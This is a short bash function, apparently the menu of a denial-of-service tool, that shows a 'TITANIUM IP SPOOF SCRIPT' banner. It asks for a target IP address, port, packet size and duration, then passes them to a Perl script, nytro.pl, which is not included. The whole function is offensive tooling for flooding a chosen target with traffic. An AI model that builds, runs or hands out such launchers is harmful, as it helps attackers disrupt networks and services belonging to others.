nytro()
{
    clear
    echo -e " ${BLUE} "                                                
    echo -e "  ${CYAN}  ________  ________  ________  ________  __ ______ ${CYAN}"
    echo -e "  ${CYAN} |\   ____\|\   __  \|\   __  \|\   __  \|\  _____\ ${CYAN}"
    echo -e "  ${CYAN} \ \  \___|\ \  \|\  \ \  \|\  \ \  \|\  \ \  \__/  ${CYAN}"
    echo -e "  ${CYAN}  \ \_____  \ \   ____\ \  \\\  \ \  \ \  \ \   __\ ${CYAN}"
    echo -e "  ${CYAN}   \|____|\  \ \  \___|\ \  \\\  \ \  \\\  \ \  \_| ${CYAN}"
    echo -e "  ${CYAN}     ____\_\  \ \__\    \ \_______\ \_______\ \__\  ${CYAN}"
    echo -e "  ${CYAN}    |\_________\|__|     \|_______|\|_______|\|__|  ${CYAN}"
    echo -e "  ${CYAN}    \|_________| ${CYAN} " 
    echo "  +-----------------------------------------------------------------------+ "
    echo "                                                     "
    echo "  +-------------------------------------------------------------------- " 
    echo "                          TITANIUM IP SPOOF SCRIPT        "
    echo "  +-----------------------------------------------------------------------+ "
echo "Enter IP Address :"
read ip
echo "Enter Port :"
read port
echo "Enter size :"
read size
echo "Enter the time in seconds :"
read time
perl nytro.pl $ip $port $size $time

}

